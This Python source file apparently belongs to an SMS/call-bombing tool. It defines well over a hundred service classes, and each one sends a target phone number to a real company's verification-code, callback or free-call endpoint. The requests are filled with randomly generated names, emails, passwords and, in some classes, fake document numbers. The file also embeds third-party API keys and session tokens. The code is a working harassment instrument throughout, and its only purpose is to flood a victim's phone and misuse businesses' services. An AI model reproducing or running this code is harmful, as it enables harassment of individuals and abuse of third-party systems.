from random import randint

from service import *


class AtPrime(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",
            data={"phone": phone},
        )


class Taxi3040(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://3040.com.ua/taxi-ordering",
            data={"callback-phone": phone},
        )


class Zoloto585(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://zoloto585.ru/api/bcard/reg/",
            json={
                "name": rand_russian_name(),
                "surname": rand_russian_name(),
                "patronymic": rand_russian_name(),
                "sex": "m",
                "birthdate": "11.11.1999",
                "phone": format_phone(phone, "+7 (***) ***-**-**"),
                "email": rand_email(),
                "city": "Москва",
            },
        )


class AistTaxi(Service):
    async def run(self, client, phone):
        return await client.post(
            "http://94.154.218.82:7201/api/account/register/sendConfirmCode",
            json={"phone": phone},
        )


class AlfaLife(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://alfalife.cc/auth.php",
            data={"phone": phone},
        )


class Alpari(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://alpari.com/api/en/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/",
            headers={"Referer": "https://alpari.com/en/registration/"},
            json={
                "client_type": "personal",
                "email": rand_email(),
                "mobile_phone": phone,
                "deliveryOption": "sms",
            },
        )


class Apteka(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://apteka.ru/_action/auth/getForm/",
            data={
                "form[NAME]": "",
                "form[PERSONAL_GENDER]": "",
                "form[PERSONAL_BIRTHDAY]": "",
                "form[EMAIL]": "",
                "form[LOGIN]": format_phone(phone, "+7 (***) ***-**-**"),
                "form[PASSWORD]": rand_password(),
                "get-new-password": "Получите пароль по SMS",
                "user_agreement": "on",
                "personal_data_agreement": "on",
                "formType": "simple",
                "utc_offset": "120",
            },
        )


class AtPrime(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",
            data={"phone": phone},
        )


class AzbukaVkusa(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://oauth.av.ru/check-phone",
            json={"phone": format_phone(phone, "+7 (***) ***-**-**")},
        )


class Avtoobzvon(Service):
    async def run(self, client, phone):
        return await client.get(
            "https://avtobzvon.ru/request/makeTestCall",
            params={"to": format_phone(phone, "(***) ***-**-**")},
        )


class BamperBy(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://bamper.by/registration/?step=1",
            data={
                "phone": "+7" + phone,
                "submit": "Запросить смс подтверждения",
                "rules": "on",
            },
        )


class Bartokyo(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://bartokyo.ru/ajax/login.php",
            data={
                "user_phone": format_phone(phone, "+7 (***) ***-****"),
            },
        )


class Beltelecom(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru",
            data={"phone": phone},
        )


class Benzuber(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://app.benzuber.ru/login",
            data={"phone": "+7" + phone},
        )


class Bluefin(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://bluefin.moscow/auth/register/",
            data={
                "phone": format_phone(phone, "(***)***-**-**"),
                "sendphone": "Далее",
            },
        )


class Boosty(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://api.boosty.to/oauth/phone/authorize",
            data={"client_id": "+7" + phone},
        )


class Buzzols(Service):
    async def run(self, client, phone):
        return await client.get(
            "https://it.buzzolls.ru:9995/api/v2/auth/register",
            params={"phoneNumber": "+7" + phone},
            headers={"keywordapi": "ProjectVApiKeyword", "usedapiversion": "3"},
        )


class Call2Friends(Service):
    async def run(self, client, phone):
        return await client.get(
            "https://call2friends.com/call-my-phone/web/request-free-call",
            params={
                "phone": phone,
                "domain": "CALL2FRIENDS",
                "browser": "undefined",
            },
        )


class CallMyPhone(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://callmyphone.org/do-call",
            data={"phone": "+7" + phone, "browser": "undefined"},
        )


class CarSmile(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://api.carsmile.com/",
            json={
                "operationName": "enterPhone",
                "variables": {"phone": phone},
                "query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n",
            },
        )


class ChefMarket(Service):
    async def run(self, client, phone):
        return await client.get(
            "https://cm2api.chefmarket.ru/api/v1/clients/request-pin",
            json={"phone": phone},
            headers={"Platform-ID": "webDesktop"},
        )


class Cian(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://api.cian.ru/sms/v1/send-validation-code/",
            json={"phone": "+7" + phone, "type": "authenticateCode"},
        )


class Cinema5(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://cinema5.ru/api/phone_code",
            data={"phone": format_phone(phone, "+7 (***) ***-**-**")},
        )


class Citilink(Service):
    async def run(self, client, phone):
        return await client.post(
            f"https://www.citilink.ru/registration/confirm/phone/+{phone}/"
        )


class City24(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://city24.ua/personalaccount/account/registration",
            data={"PhoneNumber": phone},
        )


class CleverSite(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://clients.cleversite.ru/callback/run.php",
            data={
                "siteid": "62731",
                "num": phone,
                "title": "Онлайн-консультант",
                "referrer": "https://m.cleversite.ru/call",
            },
        )


class Creditter(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://api.creditter.ru/confirm/sms/send",
            json={
                "phone": format_phone(phone, "+7 (***) ***-**-**"),
                "type": "register",
            },
        )


class CrossStudio(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://cross-studio.ru/ajax/lk/send_sms",
            data={
                "phone": format_phone(phone, "+7 (***) ***-**-**"),
                "email": rand_email(),
                "pass": rand_password(),
                "pass1": rand_password(),
                "name": rand_username(),
                "fename": rand_username(),
                "hash": "",
            },
        )


class DeliMobil(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://api.delitime.ru/api/v2/signup",
            data={
                "SignupForm[username]": phone,
                "SignupForm[device_type]": 3,
            },
        )


class Dianet(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://my.dianet.com.ua/send_sms/",
            data={"phone": phone},
        )


class DNSShop(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://www.dns-shop.ru/order/order-single-page/check-and-initiate-phone-confirmation/",
            params={"phone": phone, "is_repeat": 0, "order_guid": 1},
        )


class EasyPay(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://api.easypay.ua/api/auth/register",
            json={"phone": phone, "password": rand_password()},
        )


class Edostav(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://vladimir.edostav.ru/site/CheckAuthLogin",
            data={"phone_or_email": "+7" + phone},
        )


class EldoradoUA(Service):
    async def run(self, client, phone):
        return await client.get(
            "https://api.eldorado.ua/v1/sign/",
            params={
                "login": phone,
                "step": "phone-check",
                "fb_id": "null",
                "fb_token": "null",
                "lang": "ru",
            },
        )


class EshDerevenskoe(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://esh-derevenskoe.ru/index.php?route=checkout/checkout_ajax/sendcode&ajax=yes",
            data={"need_reg": "1", "phone": phone},
        )


class ETM(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://www.etm.ru/cat/runprog.html",
            data={
                "m_phone": phone,
                "mode": "sendSms",
                "syf_prog": "clients-services",
                "getSysParam": "yes",
            },
        )


class FiestaPizza(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://2407.smartomato.ru/account/session",
            json={
                "phone": format_phone(phone, "+7 (***) ***-**-**"),
                "g-recaptcha-response": None,
            },
        )


class Finam(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://www.finam.ru/api/smslocker/sendcode",
            data={"phone": "+" + phone},
        )


class FindClone(Service):
    async def run(self, client, phone):
        return await client.get(
            "https://findclone.ru/register",
            params={"phone": "+" + phone},
        )


class FixPrice(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://fix-price.ru/ajax/register_phone_code.php",
            data={
                "register_call": "Y",
                "action": "getCode",
                "phone": "+" + phone,
            },
        )


class FlashCall(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://i-dgtl.ru/curl/flashcall.php",
            data={
                "check": "",
                "flashcall-code": randint(1000, 9999),
                "flashcall-tel": phone,
            },
        )
        return await client.post(
            "https://i-dgtl.ru/curl/sms.php",
            data={"check": "", "flashcall-tel": phone},
        )


class Flipkart(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://www.flipkart.com/api/5/user/otp/generate",
            headers={
                "Origin": "https://www.flipkart.com",
                "X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop",
            },
            data={"loginId": "+" + phone},
        )
        return await client.post(
            "https://www.flipkart.com/api/6/user/signup/status",
            headers={
                "Origin": "https://www.flipkart.com",
                "X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop",
            },
            json={"loginId": "+" + phone, "supportAllStates": True},
        )


class FoodBand(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://foodband.ru/api?call=calls",
            data={
                "customerName": rand_russian_name(),
                "phone": format_phone(phone, "+7 (***) ***-**-**"),
                "g-recaptcha-response": "",
            },
        )
        return await client.get(
            "https://foodband.ru/api/",
            params={
                "call": "customers/sendVerificationCode",
                "phone": phone,
                "g-recaptcha-response": "",
            },
        )


class FriendsClub(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://friendsclub.ru/assets/components/pl/connector.php",
            data={"casePar": "authSendsms", "MobilePhone": "+" + phone},
        )


class GazpromBank(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://www.gazprombank.ru/rest/sms.send",
            json={
                "phone": format_phone(phone, "+7 (***) ***-**-**"),
                "type": "debit_card",
            },
        )


class Getmancar(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://crm.getmancar.com.ua/api/veryfyaccount",
            json={
                "phone": "+" + phone,
                "grant_type": "password",
                "client_id": "gcarAppMob",
                "client_secret": "SomeRandomCharsAndNumbersMobile",
            },
        )


class Kant(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://ginzadelivery.ru/v1/auth",
            json={"phone": phone},
        )


class Grillnica(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://grilnica.ru/loginphone/",
            data={
                "step": 0,
                "phone": format_phone(phone, "+7 (***) ***-****"),
                "code": "",
                "allow_sms": "on",
                "apply_offer": "on",
            },
        )


class GuruTaxi(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://guru.taxi/api/v1/driver/session/verify",
            json={"phone": {"code": 1, "number": phone}},
        )


class Hatimaki(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://www.hatimaki.ru/register/",
            data={
                "REGISTER[LOGIN]": phone,
                "REGISTER[PERSONAL_PHONE]": phone,
                "REGISTER[SMS_CODE]": "",
                "resend-sms": "1",
                "REGISTER[EMAIL]": "",
                "register_submit_button": "Зарегистрироваться",
            },
        )


class Helsi(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://helsi.me/api/healthy/accounts/login",
            json={"phone": phone, "platform": "PISWeb"},
        )


class Hmara(Service):
    async def run(self, client, phone):
        return await client.get(
            "https://api.hmara.tv/stable/entrance",
            params={"contact": phone},
        )


class ICQ(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://www.icq.com/smsreg/requestPhoneValidation.php",
            data={
                "msisdn": phone,
                "locale": "en",
                "countryCode": "ru",
                "version": "1",
                "k": "ic1rtwz1s1Hj1O0r",
                "r": "46763",
            },
        )


class IevaPhone(Service):
    async def run(self, client, phone):
        return await client.get(
            "https://ievaphone.com/call-my-phone/web/request-free-call",
            params={
                "phone": phone,
                "domain": "IEVAPHONE",
                "browser": "undefined",
            },
        )


class Imgur(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://api.imgur.com/account/v1/phones/verify",
            json={"phone_number": phone, "region_code": "RU"},
        )


class InDriver(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://terra-1.indriverapp.com/api/authorization?locale=ru",
            data={
                "mode": "request",
                "phone": "+" + phone,
                "phone_permission": "unknown",
                "stream_id": 0,
                "v": 3,
                "appversion": "3.20.6",
                "osversion": "unknown",
                "devicemodel": "unknown",
            },
        )


class InformaticsYandex(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://informatics.yandex/api/v1/registration/confirmation/phone/send/",
            data={
                "country": "RU",
                "csrfmiddlewaretoken": "",
                "phone": phone,
            },
        )


class Ingos(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://www.ingos.ru/api/v1/lk/auth/register/fast/step2",
            headers={"Referer": "https://www.ingos.ru/cabinet/registration/personal"},
            json={
                "Birthday": "1986-07-10T07:19:56.276+02:00",
                "DocIssueDate": "2004-02-05T07:19:56.276+02:00",
                "DocNumber": randint(500000, 999999),
                "DocSeries": randint(5000, 9999),
                "FirstName": rand_russian_name(),
                "Gender": "M",
                "LastName": rand_russian_name(),
                "SecondName": rand_russian_name(),
                "Phone": phone,
                "Email": rand_email(),
            },
        )


class Invitro(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://lk.invitro.ru/sp/mobileApi/createUserByPassword",
            data={
                "password": rand_password(),
                "application": "lkp",
                "login": "+" + phone,
            },
        )


class IVI(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://api.ivi.ru/mobileapi/user/register/phone/v6",
            data={"phone": phone},
        )


class IWant(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://i-want.ru/api/auth/v1/customer/login/phone",
            json={"phone": phone},
        )


class IziUA(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://izi.ua/api/auth/register",
            json={
                "phone": "+" + phone,
                "name": rand_russian_name(),
                "is_terms_accepted": True,
            },
        )
        return await client.post(
            "https://izi.ua/api/auth/sms-login",
            json={"phone": "+" + phone},
        )


class Kant(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://www.kant.ru/ajax/profile/send_authcode.php",
            data={"Phone": phone},
        )


class Karusel(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://app.karusel.ru/api/v1/phone/", data={"phone": phone}
        )


class Kaspi(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://kaspi.kz/util/send-app-link",
            data={"address": phone},
        )


class KFC(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms",
            json={"phone": "+" + phone},
        )


class KiloVkusa(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://kilovkusa.ru/ajax.php",
            params={
                "block": "auth",
                "action": "send_register_sms_code",
                "data_type": "json",
            },
            data={"phone": format_phone(phone, "7 (***) ***-**-**")},
        )


class Kinoland(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://api.kinoland.com.ua/api/v1/service/send-sms",
            headers={"Agent": "website"},
            json={"Phone": phone, "Type": 1},
        )


class KoronoPay(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://koronapay.com/transfers/online/api/users/otps",
            data={"phone": phone},
        )


class Kristalnaya(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://kristalnaya.ru/ajax/ajax.php?action=send_one_pas_reg",
            data={
                "data": '{"phone":"%s"}' % format_phone(phone, "+7 (***) ***-**-**"),
            },
        )


class Kyivstar(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://cas-api.kyivstar.ua/api/sendSms",
            data={"lang": "uk", "msisdn": phone},
        )


class Lenta(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://lenta.com/api/v1/authentication/requestValidationCode",
            json={"phone": "+" + phone},
        )


class LevinBH(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://rubeacon.com/api/app/5ea871260046315837c8b6f3/middle",
            json={
                "url": "/api/client/phone_verification",
                "method": "POST",
                "data": {
                    "client_id": 5646981,
                    "phone": phone,
                    "alisa_id": 1,
                },
                "headers": {
                    "Client-Id": 5646981,
                    "Content-Type": "application/x-www-form-urlencoded",
                },
            },
        )


class LimeTaxi(Service):
    async def run(self, client, phone):
        return await client.post(
            "http://212.22.223.149:7200/api/account/register/sendConfirmCode",
            json={"phone": phone},
        )


class Loany(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://loany.com.ua/funct/ajax/registration/code",
            data={"phone": phone},
        )


class LogisticTech(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://api-rest.logistictech.ru/api/v1.1/clients/request-code",
            json={"phone": phone},
            headers={"Restaurant-chain": "c0ab3d88-fba8-47aa-b08d-c7598a3be0b9"},
        )


class Makarolls(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://makarolls.ru/bitrix/components/aloe/aloe.user/login_new.php",
            data={"data": phone, "metod": "postreg"},
        )


class MakiMaki(Service):
    async def run(self, client, phone):
        return await client.get(
            "https://makimaki.ru/system/callback.php",
            params={
                "cb_fio": rand_russian_name(),
                "cb_phone": format_phone(phone, "+7 *** *** ** **"),
            },
        )


class MenuUA(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://www.menu.ua/kiev/delivery/registration/direct-registration.html",
            data={
                "user_info[fullname]": rand_russian_name(),
                "user_info[phone]": phone,
                "user_info[email]": rand_email(),
                "user_info[password]": rand_password(),
                "user_info[conf_password]": rand_password(),
            },
        )
        return await client.post(
            "https://www.menu.ua/kiev/delivery/profile/show-verify.html",
            data={"phone": phone, "do": "phone"},
        )


class MenzaCafe(Service):
    async def run(self, client, phone):
        return await client.get(
            "https://menza-cafe.ru/system/call_me.php",
            params={
                "fio": rand_russian_name(),
                "phone": phone,
                "phone_number": "1",
            },
        )


class MisterCash(Service):
    async def run(self, client, phone):
        return await client.get(
            "https://my.mistercash.ua/ru/send/sms/registration",
            params={"number": "+" + phone},
        )


class MnogoMenu(Service):
    async def run(self, client, phone):
        return await client.get(
            f"http://mnogomenu.ru/office/password/reset/{format_phone(phone, '+7 (***) *** ** **')}",
        )


class MobilePlanet(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://mobileplanet.ua/register",
            data={
                "klient_name": rand_username(),
                "klient_phone": "+" + phone,
                "klient_email": rand_email(),
            },
        )


class ModulBank(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://my.modulbank.ru/api/v2/registration/nameAndPhone",
            json={
                "FirstName": rand_russian_name(),
                "CellPhone": phone,
                "Package": "optimal",
            },
        )


class Molbulak(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://www.molbulak.ru/ajax/smsservice.php",
            data={"command": "send_code_loan", "phone": "+" + phone},
        )


class MoneyMan(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://moneyman.ru/registration_api/actions/send-confirmation-code",
            data="+" + phone,
        )


class MonoBank(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://www.monobank.com.ua/api/mobapplink/send",
            data={"phone": "+" + phone},
        )


class MosPizza(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://mos.pizza/bitrix/components/custom/callback/templates/.default/ajax.php",
            data={"name": rand_russian_name(), "phone": phone},
        )


class Moyo(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://www.moyo.ua/identity/registration",
            data={
                "firstname": rand_russian_name(),
                "phone": phone,
                "email": rand_email(),
            },
        )


class MTSTv(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code",
            params={"msisdn": phone},
        )


class Multiplex(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://auth.multiplex.ua/login",
            json={"login": phone},
        )


class MyGames(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://account.my.games/signup_send_sms/",
            data={"phone": phone},
        )


class Niyama(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://www.niyama.ru/ajax/sendSMS.php",
            data={
                "REGISTER[PERSONAL_PHONE]": phone,
                "code": "",
                "sendsms": "Выслать код",
            },
        )


class NovayaLinya(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://www.nl.ua",
            data={
                "component": "bxmaker.authuserphone.login",
                "sessid": "bf70db951f54b837748f69b75a61deb4",
                "method": "sendCode",
                "phone": phone,
                "registration": "N",
            },
        )


class NNCard(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://nn-card.ru/api/1.0/register",
            json={"phone": phone, "password": rand_password()},
        )


class NovaPoshta(Service):
    async def run(self, client, phone):
        name = "".join(random.choices("Іїє", k=random.randint(3, 5)))

        return await client.post(
            "https://api.novaposhta.ua/v2.0/json/LoyaltyUserGeneral/registration",
            json={
                "modelName": "LoyaltyUserGeneral",
                "calledMethod": "registration",
                "system": "PA 3.0",
                "methodProperties": {
                    "City": "8d5a980d-391c-11dd-90d9-001a92567626",
                    "FirstName": name,
                    "LastName": name,
                    "Patronymic": name,
                    "Phone": f"0{phone}",
                    "Email": rand_email(),
                    "BirthDate": "02.02.2010",
                    "Password": "0c465655c53d2d8ec971581f5dfdbd83",
                    "Gender": "M",
                    "CounterpartyType": "PrivatePerson",
                    "MarketplacePartnerToken": "005056887b8d-b5da-11e6-9f54-cea38574",
                },
            },
        )


class OkeanSushi(Service):
    async def run(self, client, phone):
        return await client.get(
            "https://okeansushi.ru/includes/contact.php",
            params={
                "call_mail": "1",
                "ajax": "1",
                "name": rand_russian_name(),
                "phone": format_phone(phone, "8 (***) ***-**-**"),
                "call_time": "1",
                "pravila2": "on",
            },
        )


class Odnoklassniki(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
            data={"st.r.phone": "+" + phone},
        )


class Oldi(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://www.oldi.ru/ajax/reg.php",
            data={
                "method": "isUserPhone",
                "phone": format_phone(phone, "+7 (***) ***-**-**"),
            },
        )


class Ollis(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://www.ollis.ru/gql",
            json={
                "query": 'mutation { phone(number:"%s", locale:ru) { token error { code message } } }'
                % phone
            },
        )


class OnlineUa(Service):
    async def run(self, client, phone):
        return await client.get(
            "https://secure.online.ua/ajax/check_phone/",
            params={"reg_phone": phone},
        )


class OnTaxi(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://ontaxi.com.ua/api/v2/web/client",
            json={
                "country": "RU",
                "phone": phone,
            },
        )


class Osaka(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://www.osaka161.ru/local/tools/webstroy.webservice.php",
            data={
                "name": "Auth.SendPassword",
                "params[0]": format_phone(phone, "+7 (***) ***-**-**"),
            },
        )


class Ozon(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://www.ozon.ru/api/composer-api.bx/_action/fastEntry",
            json={"phone": phone, "otpId": 0},
        )


class PanPizza(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://www.panpizza.ru/index.php?route=account/customer/sendSMSCode",
            data={"telephone": "8" + phone[1:]},
        )


class PirogiN1(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://piroginomerodin.ru/index.php?route=sms/login/sendreg",
            data={"telephone": "+" + phone},
        )


class Pizza46(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://pizza46.ru/ajaxGet.php",
            data={"phone": format_phone(phone, "+7 (***) ***-****")},
        )


class PizzaKazan(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://pizzakazan.com/auth/ajax.php",
            data={"phone": "+" + phone, "method": "sendCode"},
        )


class PizzaSinizza(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://pizzasinizza.ru/api/phoneCode.php",
            json={"phone": phone},
        )


class PizzaSushiWok(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://pizzasushiwok.ru/index.php",
            data={
                "mod_name": "call_me",
                "task": "request_call",
                "name": rand_russian_name(),
                "phone": format_phone(phone, "8-***-***-**-**"),
            },
        )


class PlanetaKino(Service):
    async def run(self, client, phone):
        return await client.get(
            "https://cabinet.planetakino.ua/service/sms",
            params={"phone": phone},
        )


class Pliskov(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://pliskov.ru/Cube.MoneyRent.Orchard.RentRequest/PhoneConfirmation/SendCode",
            data={"phone": format_phone(phone, "+7 (***) ***-**-**")},
        )


class Pomodoro(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://butovo.pizzapomodoro.ru/ajax/user/auth.php",
            data={
                "AUTH_ACTION": "SEND_USER_CODE",
                "phone": format_phone(phone, "+7 (***) ***-**-**"),
            },
        )


class PrivatBankCard(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://carddesign.privatbank.ua/phone",
            data={"phone": "+" + phone},
        )


class ProSushi(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://www.prosushi.ru/php/profile.php",
            data={"phone": "+" + phone, "mode": "sms"},
        )


class QBBox(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://qbbox.ru/api/user",
            json={"phone": phone, "account_type": 1},
        )


class Qlean(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",
            json={"phone": phone},
        )
        return await client.get(
            "https://sso.cloud.qlean.ru/http/users/requestotp",
            headers={"Referer": "https://qlean.ru/sso?redirectUrl=https://qlean.ru/"},
            params={
                "phone": phone,
                "clientId": "undefined",
                "sessionId": str(randint(5000, 9999)),
            },
        )


class Raiffeisen(Service):
    async def run(self, client, phone):
        return await client.get(
            "https://oapi.raiffeisen.ru/api/sms-auth/public/v1.0/phone/code",
            params={"number": phone},
        )


class Rbt(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://www.rbt.ru/user/sendCode/",
            data={"phone": format_phone(phone, "+7 (***) ***-**-**")},
        )


class RendesVouz(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://www.rendez-vous.ru/ajax/SendPhoneConfirmationNew/",
            data={
                "phone": format_phone(phone, "+7(***)***-**-**"),
                "alien": "0",
            },
        )


class SushiRolla(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://sushirolla.ru/page/save.php",
            data={
                "send_me_password": 1,
                "phone": format_phone(phone, "+7(***) ***-**-**"),
            },
        )


class RichFamily(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://richfamily.ru/ajax/sms_activities/sms_validate_phone.php",
            data={"phone": "+" + phone},
        )


class Rieltor(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://rieltor.ua/api/users/register-sms/",
            json={"phone": phone, "retry": 0},
        )


class RuTaxi(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://rutaxi.ru/ajax_auth.html",
            data={"l": phone, "c": "3"},
        )


class RuTube(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://pass.rutube.ru/api/accounts/phone/send-password/",
            json={"phone": "+" + phone},
        )


class Sayoris(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://sayoris.ru/?route=parse/whats",
            data={"phone": phone},
        )


class Sedi(Service):
    async def run(self, client, phone):
        return await client.get(
            "https://msk1.sedi.ru/webapi",
            params={
                "callback": "jQuery19107992940218113256_1595059640271",
                "q": "get_activation_key",
                "phone": format_phone(phone, "+7 (***) ***-**-**"),
                "way": "bysms",
                "usertype": "customer",
                "lang": "ru-RU",
                "apikey": "EF96ADBE-2DFC-48F7-AF0A-69A007223039",
            },
        )


class Shafa(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://shafa.ua/api/v3/graphiql",
            json={
                "operationName": "RegistrationSendSms",
                "variables": {"phoneNumber": "+" + phone},
                "query": "mutation RegistrationSendSms($phoneNumber: String!) {\n  unauthorizedSendSms(phoneNumber: $phoneNumber) {\n    isSuccess\n    userToken\n    errors {\n      field\n      messages {\n        message\n        code\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n",
            },
        )

        return await client.post(
            "https://shafa.ua/api/v3/graphiql",
            json={
                "operationName": "sendResetPasswordSms",
                "variables": {"phoneNumber": "+" + phone},
                "query": "mutation sendResetPasswordSms($phoneNumber: String!) {\n  resetPasswordSendSms(phoneNumber: $phoneNumber) {\n    isSuccess\n    userToken\n    errors {\n      ...errorsData\n      __typename\n    }\n    __typename\n  }\n}\n\nfragment errorsData on GraphResponseError {\n  field\n  messages {\n    code\n    message\n    __typename\n  }\n  __typename\n}\n",
            },
        )


class ShopAndShow(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://shopandshow.ru/sms/password-request/",
            data={"phone": "+" + phone, "resend": 0},
        )


class SignalIs(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://deathstar.signal.is/auth",
            data={"phone": "+" + phone},
        )


class SipNet(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://register.sipnet.ru/cgi-bin/exchange.dll/RegisterHelper",
            params={"oper": 9, "callmode": 1, "phone": phone},
        )


class SmartSpace(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://smart.space/api/users/request_confirmation_code/",
            json={"mobile": "+" + phone, "action": "confirm_mobile"},
        )


class SMS4b(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://www.sms4b.ru/bitrix/components/sms4b/sms.demo/ajax.php",
            data={"demo_number": "+" + phone, "ajax_demo_send": "1"},
        )


class Sovest(Service):
    async def run(self, client, phone):
        return await client.get(
            "https://oauth.sovest.ru/oauth/authorize",
            data={
                "client_id": "dbo_web",
                "response_type": "urn:qiwi:oauth:response-type:confirmation-id",
                "username": "+" + phone,
                "recaptcha": "",
            },
        )


class Sportmaster(Service):
    async def run(self, client, phone):
        return await client.get(
            "https://www.sportmaster.ru/user/session/sendSmsCode.do",
            params={"phone": format_phone(phone, "+7 (***) ***-**-**")},
        )


class SportmasterUA(Service):
    async def run(self, client, phone):
        return await client.get(
            "https://www.sportmaster.ua/",
            params={
                "module": "users",
                "action": "SendSMSReg",
                "phone": phone,
            },
        )


class Suanshi(Service):
    async def run(self, client, phone):
        return await client.get(
            "https://suandshi.ru/mobile_api/register_mobile_user",
